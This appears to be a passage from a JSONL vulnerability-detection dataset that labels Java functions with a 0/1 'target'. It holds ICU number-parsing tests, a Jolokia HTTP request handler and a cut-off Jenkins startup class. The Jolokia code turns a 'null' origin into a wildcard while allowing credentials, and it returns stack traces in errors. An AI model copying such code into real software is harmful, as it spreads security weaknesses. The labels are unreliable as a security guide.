DecimalFormatSymbols.getInstance(ULocale.ENGLISH);\n        DecimalFormat df = new DecimalFormat(\"0x%\", dfs);\n        df.setParseStrict(true);\n        expect2(df, 0.5, \"50x%\");\n    }\n\n    @Test\n    public void testParseIsoStrict() {\n        DecimalFormatSymbols dfs = DecimalFormatSymbols.getInstance(ULocale.ENGLISH);\n        DecimalFormat df = new DecimalFormat(\"¤¤0;-0¤¤\", dfs);\n        df.setCurrency(Currency.getInstance(\"USD\"));\n        df.setParseStrict(true);\n        expect2(df, 45, \"USD 45.00\");\n        expect2(df, -45, \"-45.00 USD\");\n    }\n\n    @Test\n    public void test13684_FrenchPercentParsing() {\n        NumberFormat numberFormat = NumberFormat.getPercentInstance(ULocale.FRENCH);\n        numberFormat.setParseStrict(true);\n        ParsePosition ppos = new ParsePosition(0);\n        Number percentage = numberFormat.parse(\"8\\u00A0%\", ppos);\n        assertEquals(\"Should parse successfully\", 0.08, percentage.doubleValue());\n        assertEquals(\"Should consume whole string\", 3, ppos.getIndex());\n    }\n\n    @Test\n    public void testStrictParseCurrencyLongNames() {\n        DecimalFormat df = (DecimalFormat) DecimalFormat.getInstance(ULocale.ENGLISH, DecimalFormat.PLURALCURRENCYSTYLE);\n        df.setParseStrict(true);\n        df.setCurrency(Currency.getInstance(\"USD\"));\n        double input = 514.23;\n        String formatted = df.format(input);\n        String expected = \"514.23 US dollars\";\n        assertEquals(\"Should format as expected\", expected, formatted);\n        ParsePosition ppos = new ParsePosition(0);\n        CurrencyAmount ca = df.parseCurrency(formatted, ppos);\n        assertEquals(\"Should consume whole number\", ppos.getIndex(), 17);\n        assertEquals(\"Number should round-trip\", ca.getNumber().doubleValue(), input);\n        assertEquals(\"Should get correct currency\", ca.getCurrency().getCurrencyCode(), \"USD\");\n        // Should also round-trip in non-currency parsing\n        expect2(df, input, expected);\n    }\n\n    @Test\n    public void testStrictParseCurrencySpacing() {\n        DecimalFormat df = new DecimalFormat(\"¤ 0\", DecimalFormatSymbols.getInstance(ULocale.ROOT));\n        df.setCurrency(Currency.getInstance(\"USD\"));\n        df.setParseStrict(true);\n        expect2(df, -51.42, \"-US$ 51.42\");\n    }\n\n    @Test\n    public void testCaseSensitiveCustomIsoCurrency() {\n        DecimalFormat df = new DecimalFormat(\"¤¤0\", DecimalFormatSymbols.getInstance(ULocale.ENGLISH));\n        df.setCurrency(Currency.getInstance(\"ICU\"));\n        ParsePosition ppos = new ParsePosition(0);\n        df.parseCurrency(\"icu123\", ppos);\n        assertEquals(\"Should succeed\", 6, ppos.getIndex());\n        assertEquals(\"Should succeed\", -1, ppos.getErrorIndex());\n    }\n\n    @Test\n    public void testCurrencyPluralAffixOverrides() {\n        // The affix setters should override CurrencyPluralInfo, used in the plural currency constructor.\n        DecimalFormat df = (DecimalFormat) NumberFormat.getInstance(ULocale.ENGLISH, NumberFormat.PLURALCURRENCYSTYLE);\n        assertEquals(\"Defaults to unknown currency\", \" (unknown currency)\", df.getPositiveSuffix());\n        df.setCurrency(Currency.getInstance(\"USD\"));\n        assertEquals(\"Should resolve to CurrencyPluralInfo\", \" US dollars\", df.getPositiveSuffix());\n        df.setPositiveSuffix(\"lala\");\n        assertEquals(\"Custom suffix should round-trip\", \"lala\", df.getPositiveSuffix());\n        assertEquals(\"Custom suffix should be used in formatting\", \"123.00lala\", df.format(123));\n    }\n\n    @Test\n    public void testParseDoubleMinus() {\n        DecimalFormat df = new DecimalFormat(\"-0\", DecimalFormatSymbols.getInstance(ULocale.ENGLISH));\n        expect2(df, -5, \"--5\");\n    }\n\n    @Test\n    public void testParsePercentRegression() {\n        DecimalFormat df1 = (DecimalFormat) NumberFormat.getInstance(ULocale.ENGLISH);\n        DecimalFormat df2 = (DecimalFormat) NumberFormat.getPercentInstance(ULocale.ENGLISH);\n        df1.setParseStrict(false);\n        df2.setParseStrict(false);\n\n        {\n            ParsePosition ppos = new ParsePosition(0);\n            Number result = df1.parse(\"50%\", ppos);\n            assertEquals(\"df1 should accept a number but not the percent sign\", 2, ppos.getIndex());\n            assertEquals(\"df1 should return the number as 50\", 50.0, result.doubleValue());\n        }\n        {\n            ParsePosition ppos = new ParsePosition(0);\n            Number result = df2.parse(\"50%\", ppos);\n            assertEquals(\"df2 should accept the percent sign\", 3, ppos.getIndex());\n            assertEquals(\"df2 should return the number as 0.5\", 0.5, result.doubleValue());\n        }\n        {\n            ParsePosition ppos = new ParsePosition(0);\n            Number result = df2.parse(\"50\", ppos);\n            assertEquals(\"df2 should return the number as 0.5 even though the percent sign is missing\",\n                    0.5,\n                    result.doubleValue());\n        }\n    }\n\n    @Test\n    public void test13148_GroupingSeparatorOverride() throws Exception {\n        DecimalFormat fmt = (DecimalFormat)NumberFormat.getInstance(new ULocale(\"en\", \"ZA\"));\n        DecimalFormatSymbols symbols = fmt.getDecimalFormatSymbols();\n        symbols.setDecimalSeparator('.');\n        symbols.setGroupingSeparator(',');\n        fmt.setDecimalFormatSymbols(symbols);\n        Number number = fmt.parse(\"300,000\");\n        assertEquals(\"Should use custom symbols and not monetary symbols\", 300000L, number);\n    }\n\n    @Test\n    public void test11897_LocalizedPatternSeparator() {\n        DecimalFormatSymbols dfs = DecimalFormatSymbols.getInstance(ULocale.ENGLISH);\n        dfs.setPatternSeparator('!');\n        DecimalFormat df = new DecimalFormat(\"0\", dfs);\n        df.applyPattern(\"a0;b0\"); // should not throw\n        assertEquals(\"should apply the normal pattern\", df.getNegativePrefix(), \"b\");\n        df.applyLocalizedPattern(\"c0!d0\"); // should not throw\n        assertEquals(\"should apply the localized pattern\", df.getNegativePrefix(), \"d\");\n    }\n\n    @Test\n    public void test13777_ParseLongNameNonCurrencyMode() {\n        // Currency long name should round-trip even when non-currency parsing is used.\n        NumberFormat df = NumberFormat.getInstance(ULocale.US, NumberFormat.PLURALCURRENCYSTYLE);\n        expect2(df, 1.5, \"1.50 US dollars\");\n    }\n\n    @Test\n    public void test13804_EmptyStringsWhenParsing() {\n        DecimalFormatSymbols dfs = DecimalFormatSymbols.getInstance(ULocale.ENGLISH);\n        dfs.setCurrencySymbol(\"\");\n        dfs.setDecimalSeparatorString(\"\");\n        dfs.setDigitStrings(new String[] { \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\" });\n        dfs.setExponentMultiplicationSign(\"\");\n        dfs.setExponentSeparator(\"\");\n        dfs.setGroupingSeparatorString(\"\");\n        dfs.setInfinity(\"\");\n        dfs.setInternationalCurrencySymbol(\"\");\n        dfs.setMinusSignString(\"\");\n        dfs.setMonetaryDecimalSeparatorString(\"\");\n        dfs.setMonetaryGroupingSeparatorString(\"\");\n        dfs.setNaN(\"\");\n        dfs.setPatternForCurrencySpacing(DecimalFormatSymbols.CURRENCY_SPC_INSERT, false, \"\");\n        dfs.setPatternForCurrencySpacing(DecimalFormatSymbols.CURRENCY_SPC_INSERT, true, \"\");\n        dfs.setPercentString(\"\");\n        dfs.setPerMillString(\"\");\n        dfs.setPlusSignString(\"\");\n\n        DecimalFormat df = new DecimalFormat(\"0\", dfs);\n        df.setGroupingUsed(true);\n        df.setScientificNotation(true);\n        df.setParseStrict(false); // enable all matchers\n        df.format(0); // should not throw or hit infinite loop\n        String[] samples = new String[] {\n                \"\",\n                \"123\",\n                \"$123\",\n                \"-\",\n                \"+\",\n                \"44%\",\n                \"1E+2.3\"\n        };\n        for (String sample : samples) {\n            logln(\"Attempting parse on: \" + sample);\n            // We don't care about the results, only that we don't throw and don't loop.\n            ParsePosition ppos = new ParsePosition(0);\n            df.parse(sample, ppos);\n            ppos = new ParsePosition(0);\n            df.parseCurrency(sample, ppos);\n        }\n\n        // Test with a nonempty exponent separator symbol to cover more code\n        dfs.setExponentSeparator(\"E\");\n        df.setDecimalFormatSymbols(dfs);\n        {\n            ParsePosition ppos = new ParsePosition(0);\n            df.parse(\"1E+2.3\", ppos);\n        }\n    }\n\n    @Test\n    public void Test20037_ScientificIntegerOverflow() throws ParseException {\n        NumberFormat nf = NumberFormat.getInstance(ULocale.US);\n\n        // Test overflow of exponent\n        Number result = nf.parse(\"1E-2147483648\");\n        assertEquals(\"Should snap to zero\",\n                \"0\", result.toString());\n\n        // Test edge case overflow of exponent\n        // Note: the behavior is different from C++; this is probably due to the\n        // intermediate BigDecimal form, which has its own restrictions\n        result = nf.parse(\"1E-2147483647E-1\");\n        assertEquals(\"Should not overflow and should parse only the first exponent\",\n                \"0.0\", result.toString());\n\n        // For Java, we should get *pretty close* to 2^31.\n        result = nf.parse(\"1E-547483647\");\n        assertEquals(\"Should *not* snap to zero\",\n                \"1E-547483647\", result.toString());\n    }\n\n    @Test\n    public void test13840_ParseLongStringCrash() throws ParseException {\n        NumberFormat nf = NumberFormat.getInstance(ULocale.ENGLISH);\n        String bigString =\n            \"111111111111111111111111111111111111111111111111111111111111111111111\" +\n            \"111111111111111111111111111111111111111111111111111111111111111111111\" +\n            \"111111111111111111111111111111111111111111111111111111111111111111111\" +\n            \"111111111111111111111111111111111111111111111111111111111111111111111\" +\n            \"111111111111111111111111111111111111111111111111111111111111111111111\" +\n            \"111111111111111111111111111111111111111111111111111111111111111111111\";\n        Number result = nf.parse(bigString);\n\n        // Normalize the input string:\n        BigDecimal expectedBigDecimal = new BigDecimal(bigString);\n        String expectedUString = expectedBigDecimal.toString();\n\n        // Get the output string:\n        BigDecimal actualBigDecimal = (BigDecimal) result;\n        String actualUString = actualBigDecimal.toString();\n\n        assertEquals(\"Should round-trip without crashing\", expectedUString, actualUString);\n    }\n}\n", "target": 1}
{"idx": 1084, "func": "package org.jolokia.http;\n\nimport java.io.*;\nimport java.net.URLDecoder;\nimport java.util.*;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\nimport javax.management.*;\n\nimport org.jolokia.backend.BackendManager;\nimport org.jolokia.config.*;\nimport org.jolokia.request.JmxRequest;\nimport org.jolokia.request.JmxRequestFactory;\nimport org.jolokia.util.LogHandler;\nimport org.json.simple.*;\nimport org.json.simple.parser.JSONParser;\nimport org.json.simple.parser.ParseException;\n\n/*\n * Copyright 2009-2013 Roland Huss\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *       http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n\n/**\n * Request handler with no dependency on the servlet API so that it can be used in\n * several different environments (like for the Sun JDK 6 {@link com.sun.net.httpserver.HttpServer}.\n *\n * @author roland\n * @since Mar 3, 2010\n */\npublic class HttpRequestHandler {\n\n    // handler for contacting the MBean server(s)\n    private BackendManager backendManager;\n\n    // Logging abstraction\n    private LogHandler logHandler;\n\n    // Global configuration\n    private Configuration config;\n\n    /**\n     * Request handler for parsing HTTP request and dispatching to the appropriate\n     * request handler (with help of the backend manager)\n     *\n     * @param pBackendManager backend manager to user\n     * @param pLogHandler log handler to where to put out logging\n     */\n    public HttpRequestHandler(Configuration pConfig, BackendManager pBackendManager, LogHandler pLogHandler) {\n        backendManager = pBackendManager;\n        logHandler = pLogHandler;\n        config = pConfig;\n    }\n\n    /**\n     * Handle a GET request\n     *\n     * @param pUri URI leading to this request\n     * @param pPathInfo path of the request\n     * @param pParameterMap parameters of the GET request  @return the response\n     */\n    public JSONAware handleGetRequest(String pUri, String pPathInfo, Map<String, String[]> pParameterMap) {\n        String pathInfo = extractPathInfo(pUri, pPathInfo);\n\n        JmxRequest jmxReq =\n                JmxRequestFactory.createGetRequest(pathInfo,getProcessingParameter(pParameterMap));\n\n        if (backendManager.isDebug()) {\n            logHandler.debug(\"URI: \" + pUri);\n            logHandler.debug(\"Path-Info: \" + pathInfo);\n            logHandler.debug(\"Request: \" + jmxReq.toString());\n        }\n        return executeRequest(jmxReq);\n    }\n\n    private ProcessingParameters getProcessingParameter(Map<String, String[]> pParameterMap) {\n        Map<String,String> ret = new HashMap<String, String>();\n        if (pParameterMap != null) {\n            for (Map.Entry<String,String[]> entry : pParameterMap.entrySet()) {\n                String values[] = entry.getValue();\n                if (values != null && values.length > 0) {\n                        ret.put(entry.getKey(), values[0]);\n                }\n            }\n        }\n        return config.getProcessingParameters(ret);\n    }\n\n    /**\n     * Handle the input stream as given by a POST request\n     *\n     *\n     * @param pUri URI leading to this request\n     * @param pInputStream input stream of the post request\n     * @param pEncoding optional encoding for the stream. If null, the default encoding is used\n     * @param pParameterMap additional processing parameters\n     * @return the JSON object containing the json results for one or more {@link JmxRequest} contained\n     *         within the answer.\n     *\n     * @throws IOException if reading from the input stream fails\n     */\n    public JSONAware handlePostRequest(String pUri, InputStream pInputStream, String pEncoding, Map<String, String[]>  pParameterMap)\n            throws IOException {\n        if (backendManager.isDebug()) {\n            logHandler.debug(\"URI: \" + pUri);\n        }\n\n        Object jsonRequest = extractJsonRequest(pInputStream,pEncoding);\n        if (jsonRequest instanceof JSONArray) {\n            List<JmxRequest> jmxRequests = JmxRequestFactory.createPostRequests((List) jsonRequest,getProcessingParameter(pParameterMap));\n\n            JSONArray responseList = new JSONArray();\n            for (JmxRequest jmxReq : jmxRequests) {\n                if (backendManager.isDebug()) {\n                    logHandler.debug(\"Request: \" + jmxReq.toString());\n                }\n                // Call handler and retrieve return value\n                JSONObject resp = executeRequest(jmxReq);\n                responseList.add(resp);\n            }\n            return responseList;\n        } else if (jsonRequest instanceof JSONObject) {\n            JmxRequest jmxReq = JmxRequestFactory.createPostRequest((Map<String, ?>) jsonRequest,getProcessingParameter(pParameterMap));\n            return executeRequest(jmxReq);\n        } else {\n            throw new IllegalArgumentException(\"Invalid JSON Request \" + jsonRequest);\n        }\n    }\n\n    /**\n     * Handling an option request which is used for preflight checks before a CORS based browser request is\n     * sent (for certain circumstances).\n     *\n     * See the <a href=\"http://www.w3.org/TR/cors/\">CORS specification</a>\n     * (section 'preflight checks') for more details.\n     *\n     * @param pOrigin the origin to check. If <code>null</code>, no headers are returned\n     * @param pRequestHeaders extra headers to check against\n     * @return headers to set\n     */\n    public Map<String, String> handleCorsPreflightRequest(String pOrigin, String pRequestHeaders) {\n        Map<String,String> ret = new HashMap<String, String>();\n        if (pOrigin != null && backendManager.isOriginAllowed(pOrigin,false)) {\n            // CORS is allowed, we set exactly the origin in the header, so there are no problems with authentication\n            ret.put(\"Access-Control-Allow-Origin\",\"null\".equals(pOrigin) ? \"*\" : pOrigin);\n            if (pRequestHeaders != null) {\n                ret.put(\"Access-Control-Allow-Headers\",pRequestHeaders);\n            }\n            // Fix for CORS with authentication (#104)\n            ret.put(\"Access-Control-Allow-Credentials\",\"true\");\n            // Allow for one year. Changes in access.xml are reflected directly in the  cors request itself\n            ret.put(\"Access-Control-Allow-Max-Age\",\"\" + 3600 * 24 * 365);\n        }\n        return ret;\n    }\n\n\n    private Object extractJsonRequest(InputStream pInputStream, String pEncoding) throws IOException {\n        InputStreamReader reader = null;\n        try {\n            reader =\n                    pEncoding != null ?\n                            new InputStreamReader(pInputStream, pEncoding) :\n                            new InputStreamReader(pInputStream);\n            JSONParser parser = new JSONParser();\n            return parser.parse(reader);\n        } catch (ParseException exp) {\n            throw new IllegalArgumentException(\"Invalid JSON request \" + reader,exp);\n        }\n    }\n\n    /**\n     * Execute a single {@link JmxRequest}. If a checked  exception occurs,\n     * this gets translated into the appropriate JSON object which will get returned.\n     * Note, that these exceptions gets *not* translated into an HTTP error, since they are\n     * supposed <em>Jolokia</em> specific errors above the transport layer.\n     *\n     * @param pJmxReq the request to execute\n     * @return the JSON representation of the answer.\n     */\n    private JSONObject executeRequest(JmxRequest pJmxReq) {\n        // Call handler and retrieve return value\n        try {\n            return backendManager.handleRequest(pJmxReq);\n        } catch (ReflectionException e) {\n            return getErrorJSON(404,e, pJmxReq);\n        } catch (InstanceNotFoundException e) {\n            return getErrorJSON(404,e, pJmxReq);\n        } catch (MBeanException e) {\n            return getErrorJSON(500,e.getTargetException(), pJmxReq);\n        } catch (AttributeNotFoundException e) {\n            return getErrorJSON(404,e, pJmxReq);\n        } catch (UnsupportedOperationException e) {\n            return getErrorJSON(500,e, pJmxReq);\n        } catch (IOException e) {\n            return getErrorJSON(500,e, pJmxReq);\n        } catch (IllegalArgumentException e) {\n            return getErrorJSON(400,e, pJmxReq);\n        } catch (SecurityException e) {\n            // Wipe out stacktrace\n            return getErrorJSON(403,new Exception(e.getMessage()), pJmxReq);\n        } catch (RuntimeMBeanException e) {\n            // Use wrapped exception\n            return errorForUnwrappedException(e,pJmxReq);\n        }\n    }\n\n\n    /**\n     * Utility method for handling single runtime exceptions and errors. This method is called\n     * in addition to and after {@link #executeRequest(JmxRequest)} to catch additional errors.\n     * They are two different methods because of bulk requests, where each individual request can\n     * lead to an error. So, each individual request is wrapped with the error handling of\n     * {@link #executeRequest(JmxRequest)}\n     * whereas the overall handling is wrapped with this method. It is hence more coarse grained,\n     * leading typically to an status code of 500.\n     *\n     * Summary: This method should be used as last security belt is some exception should escape\n     * from a single request processing in {@link #executeRequest(JmxRequest)}.\n     *\n     * @param pThrowable exception to handle\n     * @return its JSON representation\n     */\n    public JSONObject handleThrowable(Throwable pThrowable) {\n        if (pThrowable instanceof IllegalArgumentException) {\n            return getErrorJSON(400,pThrowable, null);\n        } else if (pThrowable instanceof SecurityException) {\n            // Wipe out stacktrace\n            return getErrorJSON(403,new Exception(pThrowable.getMessage()), null);\n        } else {\n            return getErrorJSON(500,pThrowable, null);\n        }\n    }\n\n\n    /**\n     * Get the JSON representation for a an exception\n     *\n     *\n     * @param pErrorCode the HTTP error code to return\n     * @param pExp the exception or error occured\n     * @param pJmxReq request from where to get processing options\n     * @return the json representation\n     */\n    public JSONObject getErrorJSON(int pErrorCode, Throwable pExp, JmxRequest pJmxReq) {\n        JSONObject jsonObject = new JSONObject();\n        jsonObject.put(\"status\",pErrorCode);\n        jsonObject.put(\"error\",getExceptionMessage(pExp));\n        jsonObject.put(\"error_type\", pExp.getClass().getName());\n        addErrorInfo(jsonObject, pExp, pJmxReq);\n        if (backendManager.isDebug()) {\n            backendManager.error(\"Error \" + pErrorCode,pExp);\n        }\n        if (pJmxReq != null) {\n            jsonObject.put(\"request\",pJmxReq.toJSON());\n        }\n        return jsonObject;\n    }\n\n\n\n    /**\n     * Check whether the given host and/or address is allowed to access this agent.\n     *\n     * @param pHost host to check\n     * @param pAddress address to check\n     * @param pOrigin (optional) origin header to check also.\n     */\n    public void checkAccess(String pHost, String pAddress, String pOrigin) {\n        if (!backendManager.isRemoteAccessAllowed(pHost,pAddress)) {\n            throw new SecurityException(\"No access from client \" + pAddress + \" allowed\");\n        }\n        if (pOrigin != null && !backendManager.isOriginAllowed(pOrigin,true)) {\n            throw new SecurityException(\"Origin \" + pOrigin + \" is not allowed to call this agent\");\n        }\n    }\n\n    /**\n     * Check whether for the given host is a cross-browser request allowed. This check is delegated to the\n     * backendmanager which is responsible for the security configuration.\n     * Also, some sanity checks are applied.\n     *\n     * @param pOrigin the origin URL to check against\n     * @return the origin to put in the response header or null if none is to be set\n     */\n    public String extractCorsOrigin(String pOrigin) {\n        if (pOrigin != null) {\n            // Prevent HTTP response splitting attacks\n            String origin  = pOrigin.replaceAll(\"[\\\\n\\\\r]*\",\"\");\n            if (backendManager.isOriginAllowed(origin,false)) {\n                return \"null\".equals(origin) ? \"*\" : origin;\n            } else {\n                return null;\n            }\n        }\n        return null;\n    }\n\n    private void addErrorInfo(JSONObject pErrorResp, Throwable pExp, JmxRequest pJmxReq) {\n        String includeStackTrace = pJmxReq != null ?\n                pJmxReq.getParameter(ConfigKey.INCLUDE_STACKTRACE) : \"true\";\n        if (includeStackTrace.equalsIgnoreCase(\"true\") ||\n            (includeStackTrace.equalsIgnoreCase(\"runtime\") && pExp instanceof RuntimeException)) {\n            StringWriter writer = new StringWriter();\n            pExp.printStackTrace(new PrintWriter(writer));\n            pErrorResp.put(\"stacktrace\",writer.toString());\n        }\n        if (pJmxReq != null && pJmxReq.getParameterAsBool(ConfigKey.SERIALIZE_EXCEPTION)) {\n            pErrorResp.put(\"error_value\",backendManager.convertExceptionToJson(pExp,pJmxReq));\n        }\n    }\n\n    // Extract class and exception message for an error message\n    private String getExceptionMessage(Throwable pException) {\n        String message = pException.getLocalizedMessage();\n        return pException.getClass().getName() + (message != null ? \" : \" + message : \"\");\n    }\n\n    // Unwrap an exception to get to the 'real' exception\n    // and extract the error code accordingly\n    private JSONObject errorForUnwrappedException(Exception e, JmxRequest pJmxReq) {\n        Throwable cause = e.getCause();\n        int code = cause instanceof IllegalArgumentException ? 400 : cause instanceof SecurityException ? 403 : 500;\n        return getErrorJSON(code,cause, pJmxReq);\n    }\n\n    // Path info might need some special handling in case when the URL\n    // contains two following slashes. These slashes get collapsed\n    // when calling getPathInfo() but are still present in the URI.\n    // This situation can happen, when slashes are escaped and the last char\n    // of an path part is such an escaped slash\n    // (e.g. \"read/domain:type=name!//attribute\")\n    // In this case, we extract the path info on our own\n\n    private static final Pattern PATH_PREFIX_PATTERN = Pattern.compile(\"^/?[^/]+/\");\n\n    private String extractPathInfo(String pUri, String pPathInfo) {\n        if (pUri.contains(\"!//\")) {\n            // Special treatment for trailing slashes in paths\n            Matcher matcher = PATH_PREFIX_PATTERN.matcher(pPathInfo);\n            if (matcher.find()) {\n                String prefix = matcher.group();\n                String pathInfoEncoded = pUri.replaceFirst(\"^.*?\" + prefix, prefix);\n                try {\n                    return URLDecoder.decode(pathInfoEncoded, \"UTF-8\");\n                } catch (UnsupportedEncodingException e) {\n                    // Should not happen at all ... so we silently fall through\n                }\n            }\n        }\n        return pPathInfo;\n    }\n}\n", "target": 0}
{"idx": 1085, "func": "/*\n * The MIT License\n * \n * Copyright (c) 2004-2009, Sun Microsystems, Inc., Kohsuke Kawaguchi, Jean-Baptiste Quenot, Tom Huybrechts\n * \n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n * \n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n * \n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage hudson;\n\nimport com.thoughtworks.xstream.converters.reflection.PureJavaReflectionProvider;\nimport com.thoughtworks.xstream.core.JVM;\nimport com.trilead.ssh2.util.IOUtils;\nimport hudson.model.Hudson;\nimport hudson.util.BootFailure;\nimport jenkins.model.Jenkins;\nimport hudson.util.HudsonIsLoading;\nimport hudson.util.IncompatibleServletVersionDetected;\nimport hudson.util.IncompatibleVMDetected;\nimport hudson.util.InsufficientPermissionDetected;\nimport hudson.util.NoHomeDir;\nimport hudson.util.RingBufferLogHandler;\nimport hudson.util.NoTempDir;\nimport hudson.util.IncompatibleAntVersionDetected;\nimport hudson.util.HudsonFailedToLoad;\nimport hudson.util.ChartUtil;\nimport hudson.util.AWTProblem;\nimport org.jvnet.localizer.LocaleProvider;\nimport org.kohsuke.stapler.jelly.JellyFacet;\nimport org.apache.tools.ant.types.FileSet;\n\nimport javax.naming.Context;\nimport javax.naming.InitialContext;\nimport javax.naming.NamingException;\nimport javax.servlet.ServletContext;\nimport javax.servlet.ServletContextEvent;\nimport javax.servlet.ServletContextListener;\nimport javax.servlet.ServletResponse;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.TransformerFactoryConfigurationError;\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.lang.reflect.Method;\nimport java.net.URL;\nimport java.net.URLClassLoader;\nimport java.util.Date;\nimport java.util.Locale;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\nimport java.security.Security;\nimport java.util.logging.LogRecord;\n\nimport static java.util.logging.Level.*;\n\n/**\n * Entry point when Hudson is used as a webapp.\n *\n * @author Kohsuke Kawaguchi\n */\npublic class WebAppMain implements ServletContextListener {\n    private final RingBufferLogHandler handler = new RingBufferLogHandler() {\n        @Override public synchronized void publish(LogRecord record) {\n            if (record.getLevel().intValue() >= Level.INFO.intValue()) {\n                super.publish(record);\n            }\n        }\n    };\n    private static final String APP = \"app\";\n    private boolean terminated;\n    private Thread initThread;\n\n    /**\n     * Creates the sole instance of {@link jenkins.model.Jenkins} and register it to the {@link ServletContext}.\n     */\n    public void contextInitialized(ServletContextEvent event) {\n        final ServletContext context = event.getServletContext();\n        File home=null;\n        try {\n\n            // use the current request to determine the language\n            LocaleProvider.setProvider(new LocaleProvider() {\n                public Locale get() {\n                    return Functions.getCurrentLocale();\n                }\n            });\n\n            // quick check to see if we (seem to) have enough permissions to run. (see #719)\n            JVM jvm;\n            try {\n                jvm = new JVM();\n                new URLClassLoader(new URL[0],getClass().getClassLoader());\n            } catch(SecurityException e) {\n                throw new InsufficientPermissionDetected(e);\n            }\n\n            try {// remove Sun PKCS11 provider if present. See http://wiki.jenkins-ci.org/display/JENKINS/Solaris+Issue+6276483\n                Security.removeProvider(\"SunPKCS11-Solaris\");\n            } catch (SecurityException e) {\n                // ignore this error.\n            }\n\n            installLogger();\n\n            markCookieAsHttpOnly(context);\n\n            final FileAndDescription describedHomeDir = getHomeDir(event);\n            home = describedHomeDir.file.getAbsoluteFile();\n            home.mkdirs();\n            System.out.println(\"Jenkins home directory: \"+home+\" found at: \"+describedHomeDir.description);\n\n            // check that home exists (as mkdirs could have failed silently), otherwise throw a meaningful error\n            if (!home.exists())\n                throw new NoHomeDir(home);\n\n            recordBootAttempt(home);\n\n            // make sure that we are using XStream in the \"enhanced\" (JVM-specific) mode\n            if(jvm.bestReflectionProvider().getClass()==PureJavaReflectionProvider.class) {\n                throw new IncompatibleVMDetected(); // nope\n            }\n\n//  JNA is no longer a hard requirement. It's just nice to have. See HUDSON-4820 for more context.\n//            // make sure JNA works. this can fail if\n//            //    - platform is unsupported\n//            //    - JNA is already loaded in another classloader\n//            // see http://wiki.jenkins-ci.org/display/JENKINS/JNA+is+already+loaded\n//            // TODO: or shall we instead modify Hudson to work gracefully without JNA?\n//            try {\n//                /*\n//                    java.lang.UnsatisfiedLinkError: Native Library /builds/apps/glassfish/domains/hudson-domain/generated/jsp/j2ee-modules/hudson-1.309/loader/com/sun/jna/sunos-sparc/libjnidispatch.so already loaded in another classloader\n//                        at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1743)\n//                        at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1674)\n//                        at java.lang.Runtime.load0(Runtime.java:770)\n//                        at java.lang.System.load(System.java:1005)\n//                        at com.sun.jna.Native.loadNativeLibraryFromJar(Native.java:746)\n//                        at com.sun.jna.Native.loadNativeLibrary(Native.java:680)\n//                        at com.sun.jna.Native.<clinit>(Native.java:108)\n//                        at hudson.util.jna.GNUCLibrary.<clinit>(GNUCLibrary.java:86)\n//                        at hudson.Util.createSymlink(Util.java:970)\n//                        at hudson.model.Run.run(Run.java:1174)\n//                        at hudson.matrix.MatrixBuild.run(MatrixBuild.java:149)\n//                        at hudson.model.ResourceController.execute(ResourceController.java:88)\n//                        at hudson.model.Executor.run(Executor.java:123)\n//                 */\n//                String.valueOf(Native.POINTER_SIZE); // this meaningless operation forces the classloading and initialization\n//            } catch (LinkageError e) {\n//                if (e.getMessage().contains(\"another classloader\"))\n//                    context.setAttribute(APP,new JNADoublyLoaded(e));\n//                else\n//                    context.setAttribute(APP,new HudsonFailedToLoad(e));\n//            }\n\n            // make sure this is servlet 2.4 container or above\n            try {\n                ServletResponse.class.getMethod(\"setCharacterEncoding\",String.class);\n            } catch (NoSuchMethodException e) {\n                throw new IncompatibleServletVersionDetected(ServletResponse.class);\n            }\n\n            // make sure that we see Ant 1.7\n            try {\n                FileSet.class.getMethod(\"getDirectoryScanner\");\n            } catch (NoSuchMethodException e) {\n                throw new IncompatibleAntVersionDetected(FileSet.class);\n            }\n\n            // make sure AWT is functioning, or else JFreeChart won't even load.\n            if(ChartUtil.awtProblemCause!=null) {\n                throw new AWTProblem(ChartUtil.awtProblemCause);\n            }\n\n            // some containers (in particular Tomcat) doesn't abort a launch\n            // even if the temp directory doesn't exist.\n            // check that and report an error\n            try {\n                File f = File.createTempFile(\"test\", \"test\");\n                f.delete();\n            } catch (IOException e) {\n                throw new NoTempDir(e);\n            }\n\n            // Tomcat breaks XSLT with JDK 5.0 and onward. Check if that's the case, and if so,\n            // try to correct it\n            try {\n                TransformerFactory.newInstance();\n                // if this works we are all happy\n            } catch (TransformerFactoryConfigurationError x) {\n                // no it didn't.\n                LOGGER.log(WARNING, \"XSLT not configured correctly. Hudson will try to fix this. See http://issues.apache.org/bugzilla/show_bug.cgi?id=40895 for more details\",x);\n                System.setProperty(TransformerFactory.class.getName(),\"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\");\n                try {\n                    TransformerFactory.newInstance();\n                    LOGGER.info(\"XSLT is set to the JAXP RI in JRE\");\n                } catch(TransformerFactoryConfigurationError y) {\n                    